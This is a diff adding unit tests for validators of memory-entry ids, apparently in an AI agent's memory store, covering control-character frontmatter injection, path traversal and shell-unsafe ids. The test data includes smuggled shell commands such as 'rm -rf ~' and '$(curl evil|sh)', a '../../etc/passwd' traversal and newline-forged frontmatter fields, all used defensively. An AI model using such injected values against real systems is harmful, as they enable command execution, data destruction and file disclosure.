@@ -1,5 +1,5 @@
 import { describe, it, expect } from "vitest";
-import { isGated, isGatedChange, targetKey, deriveAction, canonicalMemoryPath, isSafePathSegment } from "../../src/memory/gate.js";
+import { isGated, isGatedChange, targetKey, deriveAction, canonicalMemoryPath, isSafePathSegment, isSafeMemoryId, isWritableMemoryId, hasControlChars } from "../../src/memory/gate.js";
 import type { MemoryEntry } from "../../src/memory/types.js";
 
 function mk(over: Partial<MemoryEntry> = {}): MemoryEntry {
@@ -120,5 +120,64 @@ describe("isSafePathSegment", () => {
     expect(isSafePathSegment(".")).toBe(false);
     expect(isSafePathSegment("a/b")).toBe(false);
     expect(isSafePathSegment("")).toBe(false);
+  });
+});
+
+// Round-33: `isWritableMemoryId` and `isSafeMemoryId` answer DIFFERENT questions
+// and must not be unified (round-32 unified them and broke every project whose
+// directory name contains a space). Write safety = no ASCII control character
+// (the frontmatter-injection vector) + no path abuse. Shell safety = the strict
+// canonical shape, because the id gets interpolated into a runnable command.
+describe("isWritableMemoryId — WRITE safety (control chars + path), not shell safety", () => {
+  it("accepts spaces and ordinary punctuation, which cannot forge a frontmatter line", () => {
+    for (const id of [
+      "semantic/code-my project/some-slug",  // ~/code/my project — projectSlugFromPath does not sanitize
+      "semantic/p/slug with space",
+      "semantic/p;rm -rf ~/safe",
+      "semantic/$(curl evil|sh)/safe",
+      "semantic/p/x", "core/_global/rule", "semantic/my.proj-1/a.b-c",
+    ]) expect([id, isWritableMemoryId(id)]).toEqual([id, true]);
+  });
+
+  it("rejects every ASCII control character — the frontmatter-injection vector", () => {
+    for (const id of [
+      "semantic/p\nforged: value/safe", "semantic/p/safe\nstatus: active",
+      "semantic/p\rforged: value/safe", "semantic/p\tq/safe",
+      "semantic/p\u0000q/safe", "semantic/p\u007Fq/safe", "semantic/p\u0085q/safe",
+    ]) expect([JSON.stringify(id), isWritableMemoryId(id)]).toEqual([JSON.stringify(id), false]);
+  });
+
+  it("rejects traversal / empty segments / non-strings / absurdly long ids", () => {
+    for (const id of ["", "/", "a//b", "../../etc/passwd", "semantic/../core/x", "a/./b", "/leading", "trailing/", "semantic/p/.."]) {
+      expect([id, isWritableMemoryId(id)]).toEqual([id, false]);
+    }
+    expect(isWritableMemoryId(null)).toBe(false);
+    expect(isWritableMemoryId(undefined)).toBe(false);
+    expect(isWritableMemoryId(123)).toBe(false);
+    expect(isWritableMemoryId("a/" + "x".repeat(400))).toBe(false);
+  });
+
+  it("is STRICTLY WEAKER than isSafeMemoryId — never the reverse", () => {
+    const shellSafe = ["semantic/p/x", "core/_global/rule", "semantic/my.proj-1/a.b-c"];
+    const writableOnly = ["semantic/code-my project/some-slug", "semantic/p;rm -rf ~/safe"];
+    const neither = ["semantic/p\nforged: v/safe", "semantic/p/..", "a//b"];
+    for (const id of shellSafe) expect([id, isSafeMemoryId(id), isWritableMemoryId(id)]).toEqual([id, true, true]);
+    for (const id of writableOnly) expect([id, isSafeMemoryId(id), isWritableMemoryId(id)]).toEqual([id, false, true]);
+    for (const id of neither) expect([id, isSafeMemoryId(id), isWritableMemoryId(id)]).toEqual([id, false, false]);
+    // nothing may be shell-safe but unwritable
+    for (const id of [...shellSafe, ...writableOnly, ...neither]) {
+      if (isSafeMemoryId(id)) expect([id, isWritableMemoryId(id)]).toEqual([id, true]);
+    }
+  });
+});
+
+describe("hasControlChars — shared by the write gate and the renderer backstop", () => {
+  it("flags C0 / DEL / C1 and nothing else", () => {
+    for (const s of ["a\nb", "a\rb", "a\tb", "a\u0000b", "a\u007Fb", "a\u009Fb"]) {
+      expect([JSON.stringify(s), hasControlChars(s)]).toEqual([JSON.stringify(s), true]);
+    }
+    for (const s of ["", "a b", "semantic/code-my project/x", "a;b|c$(d)", "caf\u00e9", "\u4e2d\u6587"]) {
+      expect([s, hasControlChars(s)]).toEqual([s, false]);
+    }
   });
 });
